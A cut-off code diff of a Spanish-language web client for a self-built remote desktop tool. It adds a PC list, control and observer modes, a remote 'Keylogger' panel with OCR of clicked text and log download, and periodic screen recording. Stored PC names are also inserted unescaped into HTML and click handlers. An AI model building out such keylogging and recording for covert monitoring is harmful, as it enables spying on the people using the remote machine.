@@ -17,412 +17,964 @@
       --muted:   #5a5f72;
       --error:   #f75e5e;
       --success: #4fca7a;
+      --warn:    #f7a94f;
     }
 
     body {
-      background: var(--bg);
-      color: var(--text);
+      background: var(--bg); color: var(--text);
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
+      height: 100vh; display: flex; flex-direction: column; overflow: hidden;
     }
 
-    /* ── Connecting screen ─────────────────────────────────────── */
-    #connecting-screen {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    /* ── Pantallas ──────────────────────────────────────────────── */
+    .screen { display: none; flex: 1; flex-direction: column; overflow: hidden; }
+    .screen.active { display: flex; }
+
+    .center-wrap {
+      flex: 1; display: flex; align-items: center; justify-content: center;
       background: radial-gradient(ellipse at 30% 40%, #1a1d2e 0%, var(--bg) 70%);
     }
 
-    .connect-card {
+    /* ── Cards ──────────────────────────────────────────────────── */
+    .card {
       background: var(--surface);
       border: 1px solid var(--border);
       border-radius: 16px;
-      padding: 48px 40px;
-      width: 340px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 24px;
+      padding: 40px;
+      width: 400px;
+      display: flex; flex-direction: column; gap: 18px;
       box-shadow: 0 24px 64px rgba(0,0,0,0.5);
-      text-align: center;
+    }
+
+    .card-header {
+      display: flex; align-items: center; gap: 14px; margin-bottom: 4px;
     }
 
     .logo-icon {
-      width: 56px; height: 56px;
+      width: 44px; height: 44px;
       background: linear-gradient(135deg, var(--accent), #7c5cfa);
-      border-radius: 14px;
+      border-radius: 11px;
       display: flex; align-items: center; justify-content: center;
-      font-size: 26px;
+      font-size: 22px; flex-shrink: 0;
     }
 
-    .connect-card h1 {
-      font-size: 20px;
-      font-weight: 600;
-    }
+    .card-title   { font-size: 18px; font-weight: 700; }
+    .card-subtitle{ font-size: 12px; color: var(--muted); margin-top: 2px; }
 
-    .connect-card p {
-      font-size: 13px;
-      color: var(--muted);
-      line-height: 1.6;
+    /* ── Inputs ─────────────────────────────────────────────────── */
+    .field { display: flex; flex-direction: column; gap: 6px; }
+    .field label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.08em; }
+    .field input {
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 8px; padding: 10px 12px;
+      font-size: 14px; color: var(--text); outline: none;
+      transition: border-color 0.2s;
     }
+    .field input:focus { border-color: var(--accent); }
 
-    #connect-btn {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 10px;
-      background: linear-gradient(135deg, var(--accent), #7c5cfa);
-      color: #fff;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
+    /* ── Botones ────────────────────────────────────────────────── */
+    .btn {
+      padding: 11px 16px; border: none; border-radius: 8px;
+      font-size: 13px; font-weight: 600; cursor: pointer;
       transition: opacity 0.2s, transform 0.1s;
-      letter-spacing: 0.03em;
     }
+    .btn:hover  { opacity: 0.9; }
+    .btn:active { transform: scale(0.98); }
+    .btn:disabled { opacity: 0.4; cursor: not-allowed; }
 
-    #connect-btn:hover  { opacity: 0.9; }
-    #connect-btn:active { transform: scale(0.98); }
-    #connect-btn:disabled { opacity: 0.4; cursor: not-allowed; }
-
-    #status-msg {
-      font-size: 12px;
-      color: var(--muted);
-      min-height: 18px;
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent), #7c5cfa);
+      color: #fff; width: 100%;
     }
-
-    .status-error   { color: var(--error)   !important; }
-    .status-info    { color: var(--accent)   !important; }
-    .status-waiting { color: var(--muted)    !important; }
-
-    /* ── Remote screen ─────────────────────────────────────────── */
-    #remote-screen {
-      display: none;
-      flex: 1;
-      flex-direction: column;
-      overflow: hidden;
-    }
-
-    .toolbar {
-      height: 40px;
-      background: var(--surface);
-      border-bottom: 1px solid var(--border);
-      display: flex; align-items: center;
-      padding: 0 14px; gap: 10px;
-      flex-shrink: 0;
-    }
-
-    .toolbar-dot {
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: var(--success);
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50%       { opacity: 0.4; }
-    }
-
-    .toolbar-label {
-      font-size: 12px;
+    .btn-ghost {
+      background: transparent; border: 1px solid var(--border);
       color: var(--muted);
     }
+    .btn-danger {
+      background: rgba(247,94,94,0.15); color: var(--error);
+      border: 1px solid rgba(247,94,94,0.3);
+    }
+    .btn-success {
+      background: rgba(79,202,122,0.15); color: var(--success);
+      border: 1px solid rgba(79,202,122,0.3);
+    }
+    .btn-sm { padding: 5px 10px; font-size: 11px; }
 
-    .toolbar-spacer { flex: 1; }
+    .status-msg { font-size: 12px; min-height: 16px; }
+    .status-error   { color: var(--error); }
+    .status-info    { color: var(--accent); }
+    .status-ok      { color: var(--success); }
 
-    #disconnect-btn {
-      background: transparent;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      color: var(--muted);
-      font-size: 11px;
-      padding: 4px 12px;
-      cursor: pointer;
-      transition: color 0.2s, border-color 0.2s;
+    /* ── Lista de PCs ───────────────────────────────────────────── */
+    .pc-list { display: flex; flex-direction: column; gap: 8px; max-height: 300px; overflow-y: auto; }
+
+    .pc-item {
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 10px; padding: 12px 14px;
+      display: flex; align-items: center; gap: 12px;
+      cursor: pointer; transition: border-color 0.2s;
+    }
+    .pc-item:hover { border-color: var(--accent); }
+    .pc-item.offline { opacity: 0.5; cursor: not-allowed; }
+
+    .pc-dot {
+      width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0;
+    }
+    .pc-dot.online  { background: var(--success); }
+    .pc-dot.offline { background: var(--muted); }
+    .pc-dot.busy    { background: var(--warn); }
+
+    .pc-info { flex: 1; }
+    .pc-name { font-size: 13px; font-weight: 600; }
+    .pc-status { font-size: 11px; color: var(--muted); margin-top: 2px; }
+
+    .pc-actions { display: flex; gap: 6px; }
+
+    .divider {
+      border: none; border-top: 1px solid var(--border); margin: 4px 0;
     }
 
-    #disconnect-btn:hover { color: var(--error); border-color: var(--error); }
+    /* ── Tabs nav ───────────────────────────────────────────────── */
+    .nav {
+      display: flex; align-items: center; gap: 4px;
+      padding: 8px 12px;
+      background: var(--surface); border-bottom: 1px solid var(--border);
+    }
+    .nav-title { font-size: 13px; font-weight: 700; margin-right: 8px; color: var(--text); }
+    .nav-spacer { flex: 1; }
+    .nav-badge {
+      font-size: 10px; font-weight: 600; padding: 2px 8px; border-radius: 4px;
+    }
+    .badge-control  { background: rgba(79,142,247,0.15); color: var(--accent); }
+    .badge-observer { background: rgba(124,92,250,0.15); color: #7c5cfa; }
+    .badge-keylog   { background: rgba(247,169,79,0.2);  color: var(--warn); }
+    .badge-rec      { background: rgba(247,94,94,0.2);   color: var(--error); animation: blink 1s infinite; }
+    .badge-online   { background: rgba(79,202,122,0.15); color: var(--success); }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+    .nav-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+    /* ── Remote layout ──────────────────────────────────────────── */
+    .remote-layout { display: flex; flex: 1; overflow: hidden; }
+
+    .video-col { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
 
     .video-container {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #000;
-      position: relative;
-      cursor: none;
-      overflow: hidden;
+      flex: 1; display: flex; align-items: center; justify-content: center;
+      background: #000; position: relative; overflow: hidden;
     }
+    .control-mode  { cursor: none; }
+    .observer-mode { cursor: default; }
 
-    #remote-video {
-      max-width: 100%;
-      max-height: 100%;
-      display: block;
-      object-fit: contain;
-    }
+    #remote-video { max-width:100%; max-height:100%; display:block; object-fit:contain; }
 
     #cursor-dot {
-      position: absolute;
-      width: 14px; height: 14px;
-      margin-left: -7px; margin-top: -7px;
-      border-radius: 50%;
-      border: 2px solid rgba(255,255,255,0.85);
-      box-shadow: 0 0 4px rgba(0,0,0,0.5);
-      pointer-events: none;
+      position:absolute; width:14px; height:14px;
+      margin-left:-7px; margin-top:-7px;
+      border-radius:50%; border:2px solid rgba(255,255,255,0.85);
+      box-shadow:0 0 4px rgba(0,0,0,0.5); pointer-events:none;
     }
 
     #loading-overlay {
-      position: absolute; inset: 0;
-      background: #000;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      gap: 16px;
-      color: var(--muted); font-size: 13px;
+      position:absolute; inset:0; background:#000;
+      display:flex; flex-direction:column; align-items:center; justify-content:center;
+      gap:16px; color:var(--muted); font-size:13px;
     }
-
     .spinner {
-      width: 32px; height: 32px;
-      border: 2px solid var(--border);
-      border-top-color: var(--accent);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+      width:32px; height:32px; border:2px solid var(--border);
+      border-top-color:var(--accent); border-radius:50%;
+      animation:spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    #observer-overlay {
+      display:none; position:absolute; bottom:16px; left:50%; transform:translateX(-50%);
+      background:rgba(124,92,250,0.85); color:#fff; font-size:12px; font-weight:600;
+      padding:6px 16px; border-radius:20px; pointer-events:none;
     }
 
-    @keyframes spin { to { transform: rotate(360deg); } }
+    /* ── Side panel ─────────────────────────────────────────────── */
+    .side-panel {
+      width:300px; background:var(--surface);
+      border-left:1px solid var(--border);
+      display:flex; flex-direction:column; flex-shrink:0; overflow:hidden;
+    }
+
+    .panel-tabs { display:flex; border-bottom:1px solid var(--border); flex-shrink:0; }
+    .panel-tab {
+      flex:1; padding:10px 6px; font-size:11px; font-weight:600;
+      text-align:center; cursor:pointer; color:var(--muted);
+      border-bottom:2px solid transparent; transition:color 0.2s,border-color 0.2s;
+    }
+    .panel-tab:hover { color:var(--text); }
+    .panel-tab.active { color:var(--text); border-bottom-color:var(--accent); }
+
+    .panel-content { display:none; flex:1; flex-direction:column; overflow:hidden; }
+    .panel-content.active { display:flex; }
+
+    .panel-header {
+      padding:12px 16px; border-bottom:1px solid var(--border);
+      display:flex; align-items:center; gap:8px; flex-shrink:0;
+    }
+    .panel-title {
+      font-size:11px; font-weight:600; color:var(--text);
+      flex:1; text-transform:uppercase; letter-spacing:0.05em;
+    }
+
+    .panel-action-btn {
+      padding:5px 10px; border-radius:6px; font-size:11px;
+      font-weight:600; cursor:pointer; transition:opacity 0.2s; border:none;
+    }
+    .panel-action-btn:hover { opacity:0.8; }
+    .btn-warn-outline { background:rgba(247,169,79,0.2); color:var(--warn); border:1px solid rgba(247,169,79,0.3) !important; }
+    .btn-err-outline  { background:rgba(247,94,94,0.15);  color:var(--error); border:1px solid rgba(247,94,94,0.3) !important; }
+    .btn-rec-outline  { background:rgba(247,94,94,0.15);  color:var(--error); border:1px solid rgba(247,94,94,0.3) !important; }
+
+    /* Toggle mini */
+    .mini-toggle { display:flex; align-items:center; gap:6px; cursor:pointer; }
+    .mini-toggle input { display:none; }
+    .mini-slider {
+      width:32px; height:18px; border-radius:9px; background:var(--border);
+      position:relative; transition:background 0.2s; flex-shrink:0;
+    }
+    .mini-slider::before {
+      content:""; position:absolute; width:12px; height:12px;
+      left:3px; top:3px; border-radius:50%; background:var(--muted);
+      transition:transform 0.2s, background 0.2s;
+    }
+    input:checked + .mini-slider { background:var(--accent); }
+    input:checked + .mini-slider::before { transform:translateX(14px); background:#fff; }
+    .mini-label { font-size:10px; color:var(--muted); }
+
+    .panel-log {
+      flex:1; overflow-y:auto; padding:12px;
+      font-family:'SF Mono','Fira Code',monospace;
+      font-size:12px; line-height:1.8; color:var(--text);
+      word-break:break-all; white-space:pre-wrap;
+    }
+    .panel-log::-webkit-scrollbar { width:4px; }
+    .panel-log::-webkit-scrollbar-thumb { background:var(--border); border-radius:2px; }
+
+    .log-empty     { color:var(--muted); font-style:italic; font-size:11px; font-family:-apple-system,sans-serif; }
+    .log-normal    { color:var(--text); }
+    .log-special   { color:var(--warn); }
+    .log-newline   { color:var(--muted); }
+    .log-timestamp { color:#7c5cfa; font-size:10px; font-family:-apple-system,sans-serif; }
+    .log-click     { color:var(--success); }
+
+    .panel-counter { font-size:10px; color:var(--muted); text-align:center; padding:4px 12px; flex-shrink:0; }
+
+    .panel-footer {
+      padding:10px 12px; border-top:1px solid var(--border);
+      display:flex; gap:8px; flex-shrink:0;
+    }
+    .panel-footer button {
+      flex:1; padding:7px; border-radius:6px; font-size:11px;
+      font-weight:600; cursor:pointer; transition:opacity 0.2s;
+      border:1px solid var(--border);
+    }
+    .panel-footer button:hover { opacity:0.8; }
+    .btn-clear    { background:transparent; color:var(--muted); }
+    .btn-download { background:rgba(79,202,122,0.15); color:var(--success); border-color:rgba(79,202,122,0.3) !important; }
+
+    /* Grabación */
+    .rec-body { flex:1; padding:16px; display:flex; flex-direction:column; gap:14px; overflow-y:auto; }
+    .rec-status-box {
+      background:var(--bg); border:1px solid var(--border); border-radius:10px;
+      padding:16px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center;
+    }
+    .rec-indicator { width:12px; height:12px; border-radius:50%; background:var(--muted); transition:background 0.3s; }
+    .rec-indicator.active { background:var(--error); animation:blink 1s infinite; }
+    .rec-label  { font-size:13px; font-weight:600; }
+    .rec-timer  { font-size:22px; font-weight:700; font-family:'SF Mono',monospace; letter-spacing:0.05em; }
+    .rec-next   { font-size:11px; color:var(--muted); background:var(--border); border-radius:6px; padding:4px 10px; }
+    #rec-toggle-btn {
+      width:100%; padding:12px; border:none; border-radius:10px;
+      font-size:13px; font-weight:600; cursor:pointer; transition:opacity 0.2s,transform 0.1s;
+    }
+    #rec-toggle-btn:hover  { opacity:0.9; }
+    #rec-toggle-btn:active { transform:scale(0.98); }
+    #rec-toggle-btn.start { background:linear-gradient(135deg,#f75e5e,#c0392b); color:#fff; }
+    #rec-toggle-btn.stop  { background:var(--border); color:var(--muted); }
+    .rec-files-title { font-size:11px; font-weight:600; color:var(--muted); text-transform:uppercase; letter-spacing:0.08em; }
+    .rec-file-item {
+      background:var(--bg); border:1px solid var(--border); border-radius:8px;
+      padding:8px 12px; display:flex; align-items:center; gap:10px; font-size:11px;
+    }
+    .rec-file-info { flex:1; }
+    .rec-file-name { color:var(--text); font-weight:600; }
+    .rec-file-meta { color:var(--muted); margin-top:2px; }
+    .rec-file-dl {
+      background:rgba(79,202,122,0.15); color:var(--success);
+      border:1px solid rgba(79,202,122,0.3); border-radius:5px;
+      padding:3px 8px; font-size:10px; font-weight:600; cursor:pointer;
+    }
+    .rec-empty { font-size:11px; color:var(--muted); font-style:italic; }
   </style>
 </head>
 <body>
 
-<!-- ── PANTALLA DE CONEXIÓN ──────────────────────────────────── -->
-<div id="connecting-screen">
-  <div class="connect-card">
-    <div class="logo-icon">🖥</div>
-    <h1>Remote Desktop</h1>
-    <p>Conectate a tu PC de forma remota.<br>El host debe estar corriendo.</p>
-    <button id="connect-btn">Conectar</button>
-    <div id="status-msg"></div>
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 1: Selector de PC                                    -->
+<!-- ══════════════════════════════════════════════════════════════ -->
+<div class="screen active" id="screen-select">
+  <div class="center-wrap">
+    <div class="card">
+      <div class="card-header">
+        <div class="logo-icon">🖥</div>
+        <div>
+          <div class="card-title">Remote Desktop</div>
+          <div class="card-subtitle">Seleccioná una PC para conectar</div>
+        </div>
+      </div>
+
+      <div class="pc-list" id="pc-list">
+        <div class="log-empty" style="padding:8px">No hay PCs configuradas.<br>Usá el botón Admin para agregar.</div>
+      </div>
+
+      <hr class="divider" />
+
+      <div style="display:flex;gap:8px">
+        <button class="btn btn-ghost" style="flex:1" onclick="showScreen('screen-admin')">⚙ Admin</button>
+        <button class="btn btn-primary" style="flex:2" id="connect-btn" disabled>Conectar</button>
+      </div>
+      <div class="status-msg" id="select-status"></div>
+    </div>
   </div>
 </div>
 
-<!-- ── PANTALLA REMOTA ───────────────────────────────────────── -->
-<div id="remote-screen">
-  <div class="toolbar">
-    <div class="toolbar-dot"></div>
-    <span class="toolbar-label">Conectado</span>
-    <div class="toolbar-spacer"></div>
-    <button id="disconnect-btn">Desconectar</button>
-  </div>
-  <div class="video-container" id="video-container">
-    <div id="loading-overlay">
-      <div class="spinner"></div>
-      <span>Iniciando stream…</span>
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 2: Admin — gestionar PCs                            -->
+<!-- ══════════════════════════════════════════════════════════════ -->
+<div class="screen" id="screen-admin">
+  <div class="center-wrap">
+    <div class="card">
+      <div class="card-header">
+        <div class="logo-icon" style="background:linear-gradient(135deg,#7c5cfa,#4f8ef7)">⚙</div>
+        <div>
+          <div class="card-title">Administrar PCs</div>
+          <div class="card-subtitle">Guardado en este browser</div>
+        </div>
+      </div>
+
+      <div class="pc-list" id="admin-pc-list">
+        <div class="log-empty" style="padding:8px">No hay PCs guardadas.</div>
+      </div>
+
+      <hr class="divider" />
+
+      <div style="font-size:12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:0.08em">Agregar PC</div>
+
+      <div class="field">
+        <label for="new-pc-name">Nombre de la PC</label>
+        <input type="text" id="new-pc-name" placeholder="Ej: Mi PC, Oficina, Casa..." />
+      </div>
+      <div class="field">
+        <label for="new-pc-pass">Contraseña</label>
+        <input type="password" id="new-pc-pass" placeholder="La misma que en host_agent.py" />
+      </div>
+
+      <div style="display:flex;gap:8px">
+        <button class="btn btn-ghost" style="flex:1" onclick="showScreen('screen-select')">← Volver</button>
+        <button class="btn btn-primary" style="flex:2" onclick="addPC()">Agregar</button>
+      </div>
+      <div class="status-msg" id="admin-status"></div>
     </div>
-    <video id="remote-video" autoplay playsinline></video>
-    <div id="cursor-dot"></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 3: Modo de conexión                                  -->
+<!-- ══════════════════════════════════════════════════════════════ -->
+<div class="screen" id="screen-mode">
+  <div class="center-wrap">
+    <div class="card">
+      <div class="card-header">
+        <div class="logo-icon">🔌</div>
+        <div>
+          <div class="card-title" id="mode-pc-name">Conectando…</div>
+          <div class="card-subtitle">Elegí el modo de conexión</div>
+        </div>
+      </div>
+
+      <label style="display:flex;align-items:center;justify-content:space-between;background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:14px 16px;cursor:pointer;" for="ctrl-toggle">
+        <div>
+          <div style="font-size:13px;font-weight:600" id="mode-title-lbl">Modo control</div>
+          <div style="font-size:11px;color:var(--muted);margin-top:2px" id="mode-desc-lbl">Mouse y teclado activos</div>
+        </div>
+        <div style="position:relative;width:44px;height:24px;flex-shrink:0">
+          <input type="checkbox" id="ctrl-toggle" checked style="opacity:0;width:0;height:0" />
+          <span style="position:absolute;inset:0;border-radius:12px;background:var(--border);transition:background 0.2s;cursor:pointer;display:block" id="ctrl-slider"></span>
+        </div>
+      </label>
+
+      <div style="display:flex;gap:8px">
+        <button class="btn btn-ghost" style="flex:1" onclick="showScreen('screen-select')">← Volver</button>
+        <button class="btn btn-primary" style="flex:2" id="do-connect-btn">Conectar</button>
+      </div>
+      <div class="status-msg" id="mode-status"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 4: Sesión remota                                     -->
+<!-- ══════════════════════════════════════════════════════════════ -->
+<div class="screen" id="screen-remote">
+  <div class="nav">
+    <div class="nav-dot"></div>
+    <span class="nav-title" id="nav-pc-name">—</span>
+    <span class="nav-badge badge-control" id="nav-mode-badge">Control</span>
+    <span class="nav-badge badge-keylog"  id="nav-keylog-badge" style="display:none">⌨ Keylog</span>
+    <span class="nav-badge badge-rec"     id="nav-rec-badge"    style="display:none">⏺ REC</span>
+    <div class="nav-spacer"></div>
+    <button class="btn btn-ghost btn-sm" onclick="disconnect()">Desconectar</button>
+  </div>
+
+  <div class="remote-layout">
+    <div class="video-col">
+      <div class="video-container control-mode" id="video-container">
+        <div id="loading-overlay">
+          <div class="spinner"></div>
+          <span>Iniciando stream…</span>
+        </div>
+        <video id="remote-video" autoplay playsinline></video>
+        <div id="cursor-dot"></div>
+        <div id="observer-overlay">👁 MODO OBSERVADOR</div>
+      </div>
+    </div>
+
+    <div class="side-panel">
+      <div class="panel-tabs">
+        <div class="panel-tab active" data-tab="keylog">⌨ Keylogger</div>
+        <div class="panel-tab"       data-tab="record">⏺ Grabación</div>
+      </div>
+
+      <!-- Keylogger -->
+      <div class="panel-content active" id="tab-keylog">
+        <div class="panel-header">
+          <span class="panel-title">Keylogger</span>
+          <button id="keylog-toggle-btn" class="panel-action-btn btn-warn-outline">Activar</button>
+        </div>
+        <!-- OCR toggle -->
+        <div style="padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
+          <label class="mini-toggle" for="ocr-toggle">
+            <input type="checkbox" id="ocr-toggle" />
+            <span class="mini-slider"></span>
+          </label>
+          <span class="mini-label">Leer texto bajo el click (OCR)</span>
+        </div>
+        <div class="panel-log" id="panel-log">
+          <span class="log-empty">Keylogger inactivo.</span>
+        </div>
+        <div class="panel-counter" id="key-counter">0 eventos capturados</div>
+        <div class="panel-footer">
+          <button class="btn-clear"    id="clear-btn">Limpiar</button>
+          <button class="btn-download" id="download-keylog-btn">Descargar .txt</button>
+        </div>
+      </div>
+
+      <!-- Grabación -->
+      <div class="panel-content" id="tab-record">
+        <div class="rec-body">
+          <div class="rec-status-box">
+            <div class="rec-indicator" id="rec-indicator"></div>
+            <div class="rec-label" id="rec-label">Grabación inactiva</div>
+            <div class="rec-timer" id="rec-timer">00:00:00</div>
+            <div class="rec-next" id="rec-next" style="display:none">Próximo guardado: 15:00</div>
+          </div>
+          <button id="rec-toggle-btn" class="start">⏺ Iniciar grabación</button>
+          <div class="rec-files-title">Archivos guardados</div>
+          <div id="rec-files-list"><div class="rec-empty">Ningún archivo guardado aún.</div></div>
+        </div>
+      </div>
+    </div>
   </div>
 </div>
 
 <script>
-const SIGNAL_URL = window.SIGNAL_URL || "https://remoto-6lit.onrender.com"
-  
+// ── Config ───────────────────────────────────────────────────────
+const SIGNAL_URL        = "https://remoto-6lit.onrender.com";
+const MOUSE_THROTTLE_MS = 33;
+const REC_INTERVAL_MS   = 15 * 60 * 1000;
+const STORAGE_KEY       = "rdp_pcs";
+
+// ── FIX 1: Solo STUN de Google, sin TURN inestables ──────────────
 const ICE_SERVERS = [
   { urls: "stun:stun.l.google.com:19302" },
   { urls: "stun:stun1.l.google.com:19302" },
   { urls: "stun:stun2.l.google.com:19302" },
   { urls: "stun:stun3.l.google.com:19302" },
-
 ];
 
-// ── DOM ─────────────────────────────────────────────────────────
-const connectingScreen = document.getElementById("connecting-screen");
-const remoteScreen     = document.getElementById("remote-screen");
-const connectBtn       = document.getElementById("connect-btn");
-const statusMsg        = document.getElementById("status-msg");
-const remoteVideo      = document.getElementById("remote-video");
-const loadingOverlay   = document.getElementById("loading-overlay");
-const cursorDot        = document.getElementById("cursor-dot");
-const videoContainer   = document.getElementById("video-container");
-const disconnectBtn    = document.getElementById("disconnect-btn");
-
+// ── State ─────────────────────────────────────────────────────────
 let socket, pc;
+let controlMode    = true;
+let keylogActive   = false;
+let keylogText     = "";
+let keyCount       = 0;
+let logInitialized = false;
+let lastLogTs      = null;
+let selectedPC     = null;  // { name, passwordHash }
 
-// ── Status helper ───────────────────────────────────────────────
-function setStatus(msg, type = "info") {
-  statusMsg.textContent = msg;
-  statusMsg.className   = `status-${type}`;
+// Grabación
+let mediaRecorder = null, recChunks = [], recActive = false;
+let recStartTime = null, recTimerInterval = null, recSaveInterval = null;
+let savedFiles = [];
+
+// ── SHA256 ────────────────────────────────────────────────────────
+async function sha256(text) {
+  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,"0")).join("");
 }
 
-// ── Cleanup ─────────────────────────────────────────────────────
-function cleanup() {
-  if (pc)     { pc.close(); pc = null; }
-  if (socket) { socket.disconnect(); socket = null; }
-  remoteVideo.srcObject = null;
+// ── Navegación ────────────────────────────────────────────────────
+function showScreen(id) {
+  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  if (id === "screen-select") renderPCList();
+  if (id === "screen-admin")  renderAdminList();
 }
 
-function backToConnect(msg = "", type = "error") {
-  remoteScreen.style.display     = "none";
-  connectingScreen.style.display = "flex";
-  connectBtn.disabled = false;
-  if (msg) setStatus(msg, type);
-  cleanup();
+// ── LocalStorage PCs ──────────────────────────────────────────────
+function loadPCs() {
+  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]"); }
+  catch { return []; }
+}
+function savePCs(pcs) { localStorage.setItem(STORAGE_KEY, JSON.stringify(pcs)); }
+
+async function addPC() {
+  const name = document.getElementById("new-pc-name").value.trim();
+  const pass = document.getElementById("new-pc-pass").value;
+  const st   = document.getElementById("admin-status");
+  if (!name || !pass) { st.textContent = "Completá nombre y contraseña."; st.className = "status-msg status-error"; return; }
+  const hash = await sha256(pass);
+  const pcs  = loadPCs();
+  if (pcs.find(p => p.name === name)) { st.textContent = `Ya existe "${name}".`; st.className = "status-msg status-error"; return; }
+  pcs.push({ name, passwordHash: hash });
+  savePCs(pcs);
+  document.getElementById("new-pc-name").value = "";
+  document.getElementById("new-pc-pass").value = "";
+  st.textContent = `"${name}" agregada.`; st.className = "status-msg status-ok";
+  renderAdminList();
 }
 
-// ── Connect ──────────────────────────────────────────────────────
-connectBtn.addEventListener("click", () => {
-  connectBtn.disabled = true;
-  setStatus("Conectando…", "info");
+function removePC(name) {
+  const pcs = loadPCs().filter(p => p.name !== name);
+  savePCs(pcs);
+  renderAdminList();
+  renderPCList();
+}
 
-  socket = io(SIGNAL_URL, { transports: ["websocket"] });
+function renderAdminList() {
+  const pcs = loadPCs();
+  const el  = document.getElementById("admin-pc-list");
+  if (!pcs.length) { el.innerHTML = '<div class="log-empty" style="padding:8px">No hay PCs guardadas.</div>'; return; }
+  el.innerHTML = pcs.map(p => `
+    <div class="pc-item" style="cursor:default">
+      <div class="pc-dot offline"></div>
+      <div class="pc-info">
+        <div class="pc-name">${p.name}</div>
+        <div class="pc-status">Contraseña guardada</div>
+      </div>
+      <div class="pc-actions">
+        <button class="btn btn-danger btn-sm" onclick="removePC('${p.name}')">Eliminar</button>
+      </div>
+    </div>
+  `).join("");
+}
+
+function renderPCList(onlineHosts = []) {
+  const pcs = loadPCs();
+  const el  = document.getElementById("pc-list");
+  const btn = document.getElementById("connect-btn");
+  if (!pcs.length) {
+    el.innerHTML = '<div class="log-empty" style="padding:8px">No hay PCs configuradas.<br>Usá el botón Admin para agregar.</div>';
+    btn.disabled = true; return;
+  }
+  el.innerHTML = pcs.map(p => {
+    const h = onlineHosts.find(h => h.name === p.name);
+    const online = h && h.online;
+    const busy   = h && h.busy;
+    const statusText = !h ? "Desconocido" : busy ? "En uso" : online ? "En línea" : "Desconectado";
+    const dotClass   = !h ? "offline" : busy ? "busy" : online ? "online" : "offline";
+    const disabled   = !online || busy;
+    return `
+      <div class="pc-item ${disabled ? 'offline' : ''}" onclick="${disabled ? '' : `selectPC('${p.name}')`}">
+        <div class="pc-dot ${dotClass}"></div>
+        <div class="pc-info">
+          <div class="pc-name">${p.name}</div>
+          <div class="pc-status">${statusText}</div>
+        </div>
+        ${!disabled ? '<span style="font-size:18px">›</span>' : ''}
+      </div>
+    `;
+  }).join("");
+  btn.disabled = !selectedPC;
+}
+
+function selectPC(name) {
+  const pcs = loadPCs();
+  const pc  = pcs.find(p => p.name === name);
+  if (!pc) return;
+  selectedPC = pc;
+  document.querySelectorAll(".pc-item").forEach(el => el.style.borderColor = "");
+  document.querySelectorAll(".pc-item").forEach(el => {
+    if (el.querySelector(".pc-name")?.textContent === name) {
+      el.style.borderColor = "var(--accent)";
+    }
+  });
+  document.getElementById("connect-btn").disabled = false;
+  document.getElementById("connect-btn").onclick = () => goToMode(name);
+}
+
+// Al cargar, consultar hosts online
+window.addEventListener("load", () => {
+  renderPCList();
+  const tmpSocket = io(SIGNAL_URL, { transports: ["polling"] });
+  tmpSocket.on("connect", () => { tmpSocket.emit("viewer:list"); });
+  tmpSocket.on("viewer:hosts", (list) => { renderPCList(list); tmpSocket.disconnect(); });
+  tmpSocket.on("connect_error", () => tmpSocket.disconnect());
+});
+
+// ── Modo de conexión ──────────────────────────────────────────────
+const ctrlToggle = document.getElementById("ctrl-toggle");
+const ctrlSlider = document.getElementById("ctrl-slider");
+
+ctrlToggle.addEventListener("change", () => {
+  controlMode = ctrlToggle.checked;
+  ctrlSlider.style.background = controlMode ? "var(--accent)" : "var(--border)";
+  ctrlSlider.style.setProperty("--knob", controlMode ? "translateX(20px)" : "translateX(0)");
+  document.getElementById("mode-title-lbl").textContent = controlMode ? "Modo control" : "Modo observador";
+  document.getElementById("mode-desc-lbl").textContent  = controlMode ? "Mouse y teclado activos" : "Solo visualización, sin control";
+});
+
+ctrlToggle.dispatchEvent(new Event("change"));
+
+function goToMode(name) {
+  selectedPC = loadPCs().find(p => p.name === name);
+  if (!selectedPC) return;
+  document.getElementById("mode-pc-name").textContent = name;
+  showScreen("screen-mode");
+}
+
+document.getElementById("do-connect-btn").addEventListener("click", startConnect);
+
+async function startConnect() {
+  if (!selectedPC) return;
+  const st = document.getElementById("mode-status");
+  st.textContent = "Conectando…"; st.className = "status-msg status-info";
+  document.getElementById("do-connect-btn").disabled = true;
+  controlMode = ctrlToggle.checked;
+  initSocket();
+}
+
+// ── Socket ────────────────────────────────────────────────────────
+function initSocket() {
